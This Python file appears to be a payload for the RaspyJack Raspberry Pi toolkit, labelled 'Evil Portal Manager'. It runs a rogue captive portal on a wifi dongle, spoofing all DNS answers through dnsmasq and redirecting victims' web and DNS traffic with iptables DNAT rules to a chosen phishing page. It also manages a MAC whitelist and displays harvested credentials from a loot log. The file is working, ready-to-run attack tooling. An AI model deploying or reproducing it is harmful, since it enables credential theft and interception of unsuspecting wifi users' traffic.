#!/usr/bin/env python3
"""
RaspyJack Payload -- Evil Portal Manager
=========================================
Author: 7h30th3r0n3

Lifecycle management for the captive portal: install deps, start/stop/restart
the portal service, select portal page, manage whitelist, view captured creds.

Controls:
  UP/DOWN  -- Navigate menu
  OK       -- Select action
  KEY1     -- Toggle service on/off
  KEY3     -- Exit
"""
import os, sys, time, signal, subprocess, threading, json, glob
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Paths & constants
# ---------------------------------------------------------------------------
PORTAL_DIR = "/root/Raspyjack/payloads/wifi/DNSSpoof"
LOOT_DIR = "/root/Raspyjack/loot/Portal"
CONFIG_PATH = os.path.join(LOOT_DIR, "portal_config.json")
WHITELIST_PATH = os.path.join(LOOT_DIR, "whitelist.json")
CREDS_LOG = os.path.join(LOOT_DIR, "creds.log")
STATE_PATH = "/dev/shm/rj_portal_state.json"
PID_PATH = "/dev/shm/rj_portal.pid"
DNSMASQ_CONF = "/tmp/rj_portal_dnsmasq.conf"
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE = "10.0.77.10,10.0.77.250,12h"
HTTP_PORT = 80
ROW_H = 12
ROWS_VISIBLE = 7
os.makedirs(LOOT_DIR, exist_ok=True)

VIEW_MENU, VIEW_STATUS = "menu", "status"
VIEW_SELECT, VIEW_WHITELIST, VIEW_CREDS = "select_portal", "whitelist", "creds"
MENU_ITEMS = [
    "Status", "Start Portal", "Stop Portal",
    "Restart Portal", "Select Portal", "Whitelist", "View Creds",
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
view = VIEW_MENU
menu_idx = 0
scroll_pos = 0
status_msg = "Idle"
portal_running = False
running = True

# ---------------------------------------------------------------------------
# JSON file helpers
# ---------------------------------------------------------------------------
def _load_json(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default

def _save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def _load_config():
    return _load_json(CONFIG_PATH, {"selected_portal": "", "whitelist": []})

def _save_config(cfg):
    _save_json(CONFIG_PATH, cfg)

def _load_whitelist():
    return _load_json(WHITELIST_PATH, [])

def _save_whitelist(wl):
    _save_json(WHITELIST_PATH, wl)

def _load_state():
    return _load_json(STATE_PATH, {"running": False, "pid": None, "portal_name": ""})

def _save_state(state):
    _save_json(STATE_PATH, state)

# ---------------------------------------------------------------------------
# Portal discovery & client count
# ---------------------------------------------------------------------------
def _discover_portals():
    """Scan PORTAL_DIR for subdirectories containing index.html."""
    portals = []
    if not os.path.isdir(PORTAL_DIR):
        return portals
    try:
        for entry in sorted(os.listdir(PORTAL_DIR)):
            entry_path = os.path.join(PORTAL_DIR, entry)
            if os.path.isdir(entry_path) and os.path.isfile(
                os.path.join(entry_path, "index.html")
            ):
                portals.append(entry)
    except Exception:
        pass
    return portals

def _count_clients():
    """Count DHCP leases from dnsmasq lease file."""
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            return sum(1 for ln in f if ln.strip())
    except Exception:
        return 0

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------
def _run(cmd):
    subprocess.run(cmd, capture_output=True, timeout=5)

def _write_dnsmasq_conf(iface):
    with open(DNSMASQ_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndhcp-range={DHCP_RANGE}\n"
            f"address=/#/{GATEWAY_IP}\nno-resolv\nlog-queries\nlog-dhcp\n"
        )

def _iptables_whitelist_add(iface, mac):
    _run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
          "-i", iface, "-m", "mac", "--mac-source", mac, "-j", "ACCEPT"])

def _setup_iptables(iface):
    for dport, proto in [("80", "tcp"), ("53", "udp"), ("443", "tcp")]:
        dest = f"{GATEWAY_IP}:{HTTP_PORT}" if proto == "tcp" else f"{GATEWAY_IP}:53"
        _run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-i", iface, "-p", proto, "--dport", dport,
              "-j", "DNAT", "--to-destination", dest])
    for mac in _load_whitelist():
        _iptables_whitelist_add(iface, mac)

def _teardown_iptables():
    _run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"])

def _find_portal_iface():
    """Prefer USB WiFi dongle over onboard."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if name.startswith("wlan"):
                devpath = os.path.realpath(f"/sys/class/net/{name}/device")
                if "mmc" not in devpath:
                    return name
    except Exception:
        pass
    return "wlan1"

# ---------------------------------------------------------------------------
# Service lifecycle
# ---------------------------------------------------------------------------
def _start_portal():
    global portal_running, status_msg
    cfg = _load_config()
    portal_name = cfg.get("selected_portal", "")
    if not portal_name:
        with lock: status_msg = "No portal selected"
        return
    portal_path = os.path.join(PORTAL_DIR, portal_name)
    if not os.path.isdir(portal_path):
        with lock: status_msg = "Portal dir missing"
        return

    iface = _find_portal_iface()
    with lock: status_msg = "Configuring..."

    _run(["sudo", "ip", "addr", "flush", "dev", iface])
    _run(["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface])
    _run(["sudo", "ip", "link", "set", iface, "up"])
    _run(["sudo", "killall", "dnsmasq"])
    time.sleep(0.3)

    _write_dnsmasq_conf(iface)
    with lock: status_msg = "Starting dnsmasq..."
    dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)
    if dnsmasq_proc.poll() is not None:
        with lock: status_msg = "dnsmasq failed"
        return

    with lock: status_msg = "Starting HTTP..."
    http_proc = subprocess.Popen(
        ["python3", "-m", "http.server", str(HTTP_PORT),
         "--bind", GATEWAY_IP, "--directory", portal_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)
    if http_proc.poll() is not None:
        dnsmasq_proc.terminate()
        with lock: status_msg = "HTTP server failed"
        return

    try:
        with open(PID_PATH, "w") as f:
            f.write(str(http_proc.pid))
    except Exception:
        pass

    _setup_iptables(iface)
    _save_state({
        "running": True, "pid": http_proc.pid,
        "dnsmasq_pid": dnsmasq_proc.pid,
        "portal_name": portal_name, "iface": iface,
    })
    with lock:
        portal_running = True
        status_msg = f"Portal '{portal_name}' live"

def _stop_portal():
    global portal_running, status_msg
    with lock: status_msg = "Stopping..."
    state = _load_state()
    for key in ("pid", "dnsmasq_pid"):
        pid = state.get(key)
        if pid:
            try: os.kill(pid, signal.SIGTERM)
            except (ProcessLookupError, OSError): pass
    _run(["sudo", "killall", "dnsmasq"])
    _teardown_iptables()
    for path in (STATE_PATH, PID_PATH, DNSMASQ_CONF):
        try: os.remove(path)
        except FileNotFoundError: pass
        except OSError: pass
    with lock:
        portal_running = False
        status_msg = "Portal stopped"

def _restart_portal():
    _stop_portal()
    time.sleep(0.5)
    _start_portal()

# ---------------------------------------------------------------------------
# Draw helpers
# ---------------------------------------------------------------------------
def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00CCFF")

def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text, font=font, fill="#888")

def _new_frame():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    return img, ScaledDraw(img)

# ---------------------------------------------------------------------------
# View renderers
# ---------------------------------------------------------------------------
def draw_menu():
    img, d = _new_frame()
    _draw_header(d, "PORTAL MANAGER")
    with lock:
        idx, is_running = menu_idx, portal_running
    tag = "[ON]" if is_running else "[OFF]"
    d.text((95, 1), tag, font=font, fill="#00FF00" if is_running else "#FF4444")
    for i, item in enumerate(MENU_ITEMS):
        y = 16 + i * ROW_H
        if y > 110:
            break
        sel = i == idx
        d.text((2, y), f"{'>' if sel else ' '} {item}", font=font,
               fill="#00CCFF" if sel else "#AAAAAA")
    _draw_footer(d, "OK:Select K1:Toggle")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_status():
    img, d = _new_frame()
    _draw_header(d, "PORTAL STATUS")
    state = _load_state()
    up = state.get("running", False)
    name = state.get("portal_name", "None")
    clients = _count_clients()
    d.text((2, 18), "Service:", font=font, fill="#888")
    d.text((55, 18), "RUNNING" if up else "STOPPED", font=font,
           fill="#00FF00" if up else "#FF4444")
    d.text((2, 34), "Portal:", font=font, fill="#888")
    d.text((46, 34), name[:14], font=font, fill="#FFFFFF")
    d.text((2, 50), "Clients:", font=font, fill="#888")
    d.text((55, 50), str(clients), font=font, fill="#FFAA00")
    if up:
        d.text((2, 66), f"IP: {GATEWAY_IP}", font=font, fill="#666")
        d.text((2, 78), f"Iface: {state.get('iface', '?')}", font=font, fill="#666")
    with lock: msg = status_msg
    d.text((2, 94), msg[:22], font=font, fill="#FFAA00")
    _draw_footer(d, "K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_select_portal():
    img, d = _new_frame()
    _draw_header(d, "SELECT PORTAL")
    portals = _discover_portals()
    current = _load_config().get("selected_portal", "")
    with lock: sc = scroll_pos
    if not portals:
        d.text((4, 40), "No portals found", font=font, fill="#FF4444")
        d.text((4, 54), "Add dirs to:", font=font, fill="#666")
        d.text((4, 66), "DNSSpoof/", font=font, fill="#666")
    else:
        for i, name in enumerate(portals[sc:sc + ROWS_VISIBLE]):
            y = 16 + i * ROW_H
            actual_idx = sc + i
            active = name == current
            sel = actual_idx == sc
            color = "#00FF00" if active else "#00CCFF" if sel else "#AAAAAA"
            d.text((2, y), f"{'>' if sel else ' '}{'*' if active else ' '}{name[:17]}",
                   font=font, fill=color)
    _draw_footer(d, "OK:Select K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_whitelist():
    img, d = _new_frame()
    _draw_header(d, "WHITELIST")
    wl = _load_whitelist()
    with lock: sc = scroll_pos
    if not wl:
        d.text((4, 40), "No whitelisted MACs", font=font, fill="#666")
        d.text((4, 54), "OK adds last DHCP", font=font, fill="#666")
        d.text((4, 66), "lease to whitelist", font=font, fill="#666")
    else:
        for i, mac in enumerate(wl[sc:sc + ROWS_VISIBLE]):
            y = 16 + i * ROW_H
            sel = (sc + i) == sc
            d.text((2, y), f"{'>' if sel else ' '}{mac}", font=font,
                   fill="#00CCFF" if sel else "#AAAAAA")
    _draw_footer(d, f"{len(wl)} MACs OK:Add K3:Bk")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_creds():
    img, d = _new_frame()
    _draw_header(d, "CAPTURED CREDS")
    cred_lines = []
    try:
        with open(CREDS_LOG, "r") as f:
            cred_lines = f.read().splitlines()
    except Exception:
        pass
    with lock: sc = scroll_pos
    if not cred_lines:
        d.text((10, 50), "No creds yet", font=font, fill="#666")
    else:
        for i, line in enumerate(cred_lines[sc:sc + ROWS_VISIBLE]):
            d.text((2, 16 + i * ROW_H), line[:22], font=font, fill="#FFAA00")
    _draw_footer(d, f"{len(cred_lines)} lines  K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Whitelist management
# ---------------------------------------------------------------------------
def _add_client_to_whitelist():
    """Add the most recent DHCP lease MAC to the whitelist."""
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            lines = f.read().splitlines()
    except Exception:
        return "No leases found"
    if not lines:
        return "No leases"
    parts = lines[-1].strip().split()
    if len(parts) < 2:
        return "Parse error"
    mac = parts[1].upper()
    wl = _load_whitelist()
    if mac in wl:
        return f"{mac} exists"
    _save_whitelist(list(wl) + [mac])
    state = _load_state()
    if state.get("running"):
        _iptables_whitelist_add(state.get("iface", "wlan1"), mac)
    return f"Added {mac}"

def _remove_whitelist_entry(idx):
    """Remove whitelist entry by index."""
    wl = _load_whitelist()
    if 0 <= idx < len(wl):
        removed = wl[idx]
        _save_whitelist(wl[:idx] + wl[idx + 1:])
        return f"Removed {removed}"
    return "Invalid index"

# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------
def _signal_handler(_sig, _frame):
    global running
    running = False

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ---------------------------------------------------------------------------
# Menu dispatch
# ---------------------------------------------------------------------------
def _handle_menu_select():
    global view, scroll_pos
    action = MENU_ITEMS[menu_idx]
    if action == "Status":
        with lock: view, scroll_pos = VIEW_STATUS, 0
    elif action in ("Start Portal", "Stop Portal", "Restart Portal"):
        target = {"Start Portal": _start_portal, "Stop Portal": _stop_portal,
                  "Restart Portal": _restart_portal}[action]
        threading.Thread(target=target, daemon=True).start()
        with lock: view = VIEW_STATUS
    elif action == "Select Portal":
        with lock: view, scroll_pos = VIEW_SELECT, 0
    elif action == "Whitelist":
        with lock: view, scroll_pos = VIEW_WHITELIST, 0
    elif action == "View Creds":
        with lock: view, scroll_pos = VIEW_CREDS, 0

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global view, menu_idx, scroll_pos, status_msg, portal_running, running

    state = _load_state()
    portal_running = state.get("running", False)

    # Splash
    img, d = _new_frame()
    d.text((6, 16), "EVIL PORTAL MGR", font=font, fill="#FF4444")
    d.text((4, 36), "Manage captive portal", font=font, fill="#888")
    d.text((4, 48), "services & config", font=font, fill="#888")
    d.text((4, 68), "UP/DN:Nav  OK:Select", font=font, fill="#666")
    d.text((4, 80), "K1:Toggle  K3:Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view == VIEW_MENU:
                    break
                with lock: view, scroll_pos = VIEW_MENU, 0
                time.sleep(0.25)
                continue

            if btn == "KEY1":
                target = _stop_portal if portal_running else _start_portal
                threading.Thread(target=target, daemon=True).start()
                time.sleep(0.3)
                continue

            if view == VIEW_MENU:
                if btn == "UP":
                    with lock: menu_idx = max(0, menu_idx - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock: menu_idx = min(len(MENU_ITEMS) - 1, menu_idx + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    _handle_menu_select()
                    time.sleep(0.25)
                draw_menu()

            elif view == VIEW_STATUS:
                draw_status()

            elif view == VIEW_SELECT:
                portals = _discover_portals()
                if btn == "UP":
                    with lock: scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock: scroll_pos = min(max(0, len(portals) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "OK" and portals:
                    with lock: idx = scroll_pos
                    if 0 <= idx < len(portals):
                        cfg = dict(_load_config())
                        cfg["selected_portal"] = portals[idx]
                        _save_config(cfg)
                        with lock: status_msg = f"Set: {portals[idx]}"
                    time.sleep(0.25)
                draw_select_portal()

            elif view == VIEW_WHITELIST:
                wl = _load_whitelist()
                if btn == "UP":
                    with lock: scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock: scroll_pos = min(max(0, len(wl) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    msg = _add_client_to_whitelist()
                    with lock: status_msg = msg
                    time.sleep(0.25)
                elif btn == "KEY2":
                    with lock: idx = scroll_pos
                    msg = _remove_whitelist_entry(idx)
                    with lock: status_msg, scroll_pos = msg, 0
                    time.sleep(0.25)
                draw_whitelist()

            elif view == VIEW_CREDS:
                try:
                    with open(CREDS_LOG, "r") as f:
                        total = len(f.read().splitlines())
                except Exception:
                    total = 0
                if btn == "UP":
                    with lock: scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock: scroll_pos = min(max(0, total - 1), scroll_pos + 1)
                    time.sleep(0.15)
                draw_creds()

            time.sleep(0.05)

    finally:
        try: LCD.LCD_Clear()
        except Exception: pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
